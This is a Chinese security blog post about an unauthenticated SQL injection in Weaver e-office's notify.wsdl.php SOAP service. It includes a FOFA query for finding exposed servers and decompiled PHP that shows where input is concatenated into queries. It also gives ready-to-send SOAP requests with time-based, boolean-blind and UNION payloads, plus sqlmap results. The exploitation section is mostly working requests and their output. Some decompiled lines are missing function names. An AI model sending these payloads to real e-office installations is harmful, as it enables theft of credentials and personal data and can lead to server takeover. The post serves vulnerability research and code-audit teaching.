---
title: "泛微e-office notify.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-notify-wsdl-sqli.html
---

# 泛微e-office notify.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/11 18:23
* 782浏览
* [0评论](#comment)
* 3小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE "泛微")
E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office notify.wsdl.php 接口处存在
[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

直接看 notify.wsdl.php 文件业务逻辑实现

```
<?php

function GetNotifyList( $start, $limit, $search, $UserInfor )
{
    $notifyApi = new notify( $UserInfor );
    $notify_message = $notifyApi->getNotifyInfo( $limit, $start, "", $search );
    $Infor = array( );
    foreach ( $notify_message as $index => $val )
    {
        $Infor[$index]['NOTIFY_ID'] = $notify_message[$index]['NOTIFY_ID'];
        $Infor[$index]['FROM_ID'] = $notify_message[$index]['FROM_ID'];
        $Infor[$index]['FROM_NAME'] = $notify_message[$index]['FROM_NAME'];
        $Infor[$index]['SUBJECT'] = $notify_message[$index]['SUBJECT'];
        $Infor[$index]['SEND_TIME'] = $notify_message[$index]['SEND_TIME'];
        $Infor[$index]['READERS'] = $notify_message[$index]['READERS'];
        $Infor[$index]['READERS_NAME'] = ( $val['READERS'] );
        if ( ( $Infor[$index]['READERS'], $UserInfor['user_id']."," ) )
        {
            $Infor[$index]['InformationRead'] = "1";
        }
        else
        {
            $Infor[$index]['InformationRead'] = "0";
        }
        $Infor[$index]['READ_FLAG'] = $notify_message[$index]['READ_FLAG'];
        $Infor[$index]['NOTIFY_TYPE'] = $notify_message[$index]['NOTIFY_TYPE'];
        $Infor[$index]['PUBLISH_DEPT'] = $notify_message[$index]['PUBLISH_DEPT'];
        $Infor[$index]['PUBLISH_PRIV'] = $notify_message[$index]['PUBLISH_PRIV'];
        $Infor[$index]['PUBLISH_USER'] = $notify_message[$index]['PUBLISH_USER'];
    }
    return ( $Infor );
}

function GetNotifyInformation( $NotifyId, $UserInfor )
{
    $notifyApi = new notify( $UserInfor );
    $notify_update_status = $notifyApi->updateReadStatus( $NotifyId );
    $notify_message = $notifyApi->getNotifyInfo( "", "", $NotifyId, array( ) );
    foreach ( $notify_message as $index => $val )
    {
        $notify_message[$index]['READERS_NAME'] = ( $val['READERS'] );
    }
    return ( $notify_message[0] );
}

function GetNotifyType( $TypeId )
{
    $notifyApi = new notify( );
    $NotifyType = $notifyApi->GetNotifyType( $TypeId );
    return ( $NotifyType );
}

function getNotifyAmount( $search, $UserInfor )
{
    $notifyApi = new notify( $UserInfor );
    $notify_counts = $notifyApi->getNotifyAmount( $search );
    return $notify_counts;
}

function getNewNotifyAmount( $UserInfor )
{
    $notifyApi = new notify( $UserInfor );
    $notify_new_counts = $notifyApi->getNewNotifyAmount( );
    return $notify_new_counts;
}

include_once( "nusoap/lib/nusoap.php" );
include_once( "api/notify.class.php" );
include_once( "api/user.class.php" );
include_once( "inc/conn.php" );
include_once( "wap/function.php" );
include_once( "inc/checkcurrentsession.php" );
$server = new soap_server( );
$server->soap_defencoding = "UTF-8";
$server->decode_utf8 = false;
$server->configureWSDL( "notifyServicewsdl", "urn:notifyServicewsdl" );
$server->wsdl->schemaTargetNamespace = "urn:notifyServicewsdl";
$server->wsdl->addComplexType( "UserInfor", "complexType", "array", "all", "", array(
    "user_id" => array( "name" => "user_id", "type" => "xsd:string" ),
    "user_name" => array( "name" => "user_name", "type" => "xsd:string" ),
    "session_id" => array( "name" => "session_id", "type" => "xsd:string" )
) );
$server->wsdl->addComplexType( "NotifySearch", "complexType", "array", "all", "", array(
    "NotifySubject" => array( "name" => "NotifySubject", "type" => "xsd:string" ),
    "NotifySort" => array( "name" => "NotifySort", "type" => "xsd:string" ),
    "NotifyOther" => array( "name" => "NotifyOther", "type" => "xsd:string" )
) );
$server->register( "GetNotifyList", array( "start" => "xsd:string", "limit" => "xsd:string", "search" => "tns:NotifySearch", "UserInfor" => "tns:UserInfor" ), array( "return" => "xsd:string" ), "urn:notifyServicewsdl", "urn:notifyServicewsdl#GetNotifyList", "rpc", "encoded", "Get E-office notify GetNotifyList" );
$server->register( "GetNotifyInformation", array( "NotifyId" => "xsd:int", "UserInfor" => "tns:UserInfor" ), array( "return" => "xsd:string" ), "urn:notifyServicewsdl", "urn:notifyServicewsdl#GetNotifyInformation", "rpc", "encoded", "Get E-office notify GetNotifyInformation" );
$server->register( "GetNotifyType", array( "TypeId" => "xsd:string" ), array( "return" => "xsd:string" ), "urn:notifyServicewsdl", "urn:notifyServicewsdl#GetNotifyType", "rpc", "encoded", "Get Public notify type" );
$server->register( "getNotifyAmount", array( "search" => "tns:NotifySearch", "UserInfor" => "tns:UserInfor" ), array( "return" => "xsd:string" ), "urn:notifyServicewsdl", "urn:notifyServicewsdl#getNotifyAmount", "rpc", "encoded", "Get E-office notify count" );
$server->register( "getNewNotifyAmount", array( "UserInfor" => "tns:UserInfor" ), array( "return" => "xsd:string" ), "urn:notifyServicewsdl", "urn:notifyServicewsdl#getNewNotifyAmount", "rpc", "encoded", "Get E-office notify count" );
$HTTP_RAW_POST_DATA = isset( $HTTP_RAW_POST_DATA ) ? $HTTP_RAW_POST_DATA : "";
$server->service( $HTTP_RAW_POST_DATA );
?>
```

这是一个基于 PHP 的 SOAP 服务实现，它提供以下几个功能：
`getNewNotifyAmount`
、
`getNotifyAmount`
、
`GetNotifyInformation`
、
`GetNotifyList`
和
`GetNotifyType`

直接在
`webservice-json/notify/notify.wsdl.php`
后加上
`?wsdl`
再使用 SoapUI 或者 burp 的Wsdler 插件解析即可得到HTTP请求报文

![泛微e-office notify.wsdl.php sql注入漏洞](https://image.mrxn.net/fb1122c8a97b4eb18f9302064af3da8d.webp)

## getNewNotifyAmount

先看
`getNewNotifyAmount`
功能实现逻辑

`$UserInfor`
直接带入
`notify`
函数，业务逻辑如下

```
public function __construct( $userinfo = array( ) )
    {
        global $connection;
        if ( $userinfo['user_id'] == "" )
        {
            $this->userid = $_SESSION['LOGIN_USER_ID'];
        }
        else
        {
            $this->userid = $userinfo['user_id'];
        }
        if ( $this->userid )
        {
            $sql = "SELECT DEPT_ID,USER_PRIV FROM user WHERE USER_ID='".$this->userid."'";
            $rs = ( $connection, $sql );
```

`$user_id`
是直接拼接进SQL语句中执行，无任何过滤，造成SQL注入
[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
。

## getNotifyAmount

```
function getNotifyAmount( $search, $UserInfor )
{
    $notifyApi = new notify( $UserInfor );
    $notify_counts = $notifyApi->getNotifyAmount( $search );
    return $notify_counts;
}
```

`$search`
和
`$UserInfor`
分别带入
`notify`
和
`getNotifyAmount`
函数,
`notiy`
函数参考上面，
`getNotifyAmount`
业务逻辑如下

```
public function getNotifyAmount( $search = array( ) )
    {
        global $connection;
        $sql = "SELECT COUNT(NOTIFY_ID) AS CNT FROM notify WHERE PUBLIC = '1' AND OPTIONSTATE='1' AND BEGIN_DATE<='".$this->curdate."' AND ( END_DATE>='".$this->curdate."' OR END_DATE = '0000-00-00') AND( (DEPT_ID = 'ALL_DEPT') OR (INStr(DEPT_ID,',".$this->deptid.",')>0 OR INStr(DEPT_ID,'".$this->deptid.",')=1) OR (INStr(PRIV_ID,',".$this->uesrpriv.",')>0 OR  INStr(PRIV_ID,'".$this->uesrpriv.",')=1) OR (INStr(USER_ID,',".$this->userid.",')>0 OR  INStr(USER_ID,'".$this->userid.",')=1) )";
        if ( $search['NotifySubject'] != "" )
        {
            $sql .= " AND SUBJECT like '%".$search['NotifySubject']."%'";
        }
        if ( $search['NotifySort'] != "" )
        {
            $sql .= " AND NOTIFY_TYPE_ID='".$search['NotifySort']."'";
        }
        $rs = ( $connection, $sql );
        $row = ( $rs );
        $amount = $row['CNT'];
        return $amount;
    }
```

可以看到和上面的 SaveAttendance 函数注入一样也是
`$search['NotifySubject']`
、
`$search['NotifySort']`
直接拼接进SQL语句中，造成
[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
漏洞。

## GetNotifyType

```
function GetNotifyType( $TypeId )
{
    $notifyApi = new notify( );
    $NotifyType = $notifyApi->GetNotifyType( $TypeId );
    return ( $NotifyType );
}
```

`$TypeId`
直接带入
`GetNotifyType`
函数

```
public function GetNotifyType( $TypeId = "" )
    {
        global $connection;
        $NotifyType = array( );
        if ( $TypeId == "" )
        {
            $query = "SELECT * FROM notify_type ORDER BY NOTIFY_TYPE_ID ASC";
        }
        else
        {
            $query = "SELECT * FROM notify_type WHERE NOTIFY_TYPE_ID='".$TypeId."'";
        }
        $result = ( $connection, $query );
        while ( $row = ( $result ) )
        {
            $NotifyType[] = $row;
        }
        return $NotifyType;
    }
```

最终被直接拼接进SQL语句中执行，造成
[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
漏洞。

GetNotifyInformation、GetNotifyList和上述处理逻辑差不就不详细列出来了。

# 漏洞复现

## getNewNotifyAmount

```
POST /webservice-json/notify/notify.wsdl.php HTTP/1.1
Accept-Encoding: gzip, deflate, br
Content-Type: text/xml;charset=UTF-8
SOAPAction: "urn:notifyServicewsdl#getNewNotifyAmount"
Content-Length: 727
Host: eoffice.mrxn.net:8082
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.4103.116 Safari/537.36
Connection: keep-alive
X-Forwarded-For: 127.0.0.1

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:getNewNotifyAmount soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserInfor xsi:type="urn:UserInfor">
            <!--You may enter the following 3 items in any order-->
            <user_id xsi:type="xsd:string">1' AND (SELECT 2461 FROM (SELECT(SLEEP(5)))rwHk)#</user_id>
            <user_name xsi:type="xsd:string">admin</user_name>
            <session_id xsi:type="xsd:string">1</session_id>
         </UserInfor>
      </urn:getNewNotifyAmount>
   </soapenv:Body>
</soapenv:Envelope>
```

![泛微e-office notify.wsdl.php sql注入漏洞](https://image.mrxn.net/dd3bf5cab2444831b6859420a10059f1.webp)

通过时间盲注 成功延时 5 秒。

通过
[sqlmap](https://mrxn.net/tag/sqlmap)
还可测试出其他注入方式如下

```
sqlmap identified the following injection point(s) with a total of 368 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:getNewNotifyAmount soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserInfor xsi:type="urn:UserInfor">
            <!--You may enter the following 3 items in any order-->
            <user_id xsi:type="xsd:string">1' RLIKE (SELECT (CASE WHEN (3318=3318) THEN 1 ELSE 0x28 END)) AND 'hSqI'='hSqI</user_id>
            <user_name xsi:type="xsd:string">admin</user_name>
            <session_id xsi:type="xsd:string">1</session_id>
         </UserInfor>
      </urn:getNewNotifyAmount>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:getNewNotifyAmount soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserInfor xsi:type="urn:UserInfor">
            <!--You may enter the following 3 items in any order-->
            <user_id xsi:type="xsd:string">1' AND (SELECT 2461 FROM (SELECT(SLEEP(5)))rwHk)#</user_id>
            <user_name xsi:type="xsd:string">admin</user_name>
            <session_id xsi:type="xsd:string">1</session_id>
         </UserInfor>
      </urn:getNewNotifyAmount>
   </soapenv:Body>
</soapenv:Envelope>
---
```

## getNotifyAmount

```
POST /webservice-json/notify/notify.wsdl.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:notifyServicewsdl#getNotifyAmount
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082
Content-Length: 1178

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:getNotifyAmount soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <search xsi:type="urn:NotifySearch">
            <!--type: string-->
            <NotifySubject xsi:type="xsd:string">1' AND (SELECT 2461 FROM (SELECT(SLEEP(5)))rwHk)#</NotifySubject>
            <!--type: string-->
            <NotifySort xsi:type="xsd:string">sonoras imperio</NotifySort>
            <!--type: string-->
            <NotifyOther xsi:type="xsd:string">quae divum incedo</NotifyOther>
         </search>
         <UserInfor xsi:type="urn:UserInfor">
            <!--type: string-->
            <user_id xsi:type="xsd:string">1</user_id>
            <!--type: string-->
            <user_name xsi:type="xsd:string">per auras</user_name>
            <!--type: string-->
            <session_id xsi:type="xsd:string">circum claustra</session_id>
         </UserInfor>
      </urn:getNotifyAmount>
   </soapenv:Body>
</soapenv:Envelope>
```

也是同样延时 5 秒

![泛微e-office notify.wsdl.php sql注入漏洞](https://image.mrxn.net/a92784d8a9534db29e2d4faf19d2113a.webp)

## GetNotifyType

```
POST /webservice-json/notify/notify.wsdl.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:notifyServicewsdl#GetNotifyType
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetNotifyType soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <TypeId xsi:type="xsd:string">1' UNION ALL SELECT CONCAT(0x716a7a7071,0x53536f48427a6d70596c506644414b734d4e4e69586c4c6647646f4e51566f43575453706c516766,0x71626a6b71),NULL,NULL-- -</TypeId>
      </urn:GetNotifyType>
   </soapenv:Body>
</soapenv:Envelope>
```

![泛微e-office notify.wsdl.php sql注入漏洞](https://image.mrxn.net/bd86255f3301471ab5c9a6a4e500edff.webp)

也是通过联合注入，在响应里回显了测试payload。

sqlmap测试结果

```
sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetNotifyType soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <TypeId xsi:type="xsd:string">1' AND 5476=5476 AND 'kRje'='kRje</TypeId>
      </urn:GetNotifyType>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetNotifyType soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <TypeId xsi:type="xsd:string">1' AND 6893=BENCHMARK(5000000,MD5(0x6f497261)) AND 'RZzC'='RZzC</TypeId>
      </urn:GetNotifyType>
   </soapenv:Body>
</soapenv:Envelope>

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:notifyServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetNotifyType soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <TypeId xsi:type="xsd:string">1' UNION ALL SELECT CONCAT(0x716a7a7071,0x53536f48427a6d70596c506644414b734d4e4e69586c4c6647646f4e51566f43575453706c516766,0x71626a6b71),NULL,NULL-- -</TypeId>
      </urn:GetNotifyType>
   </soapenv:Body>
</soapenv:Envelope>
---
```

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[泛微e-office notify.wsdl.php sql注入漏洞](https://mrxn.net/jswz/eoffice-webservice-json-notify-wsdl-sqli.html)
  
文章链接：
<https://mrxn.net/jswz/eoffice-webservice-json-notify-wsdl-sqli.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-json-notify-wsdl-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
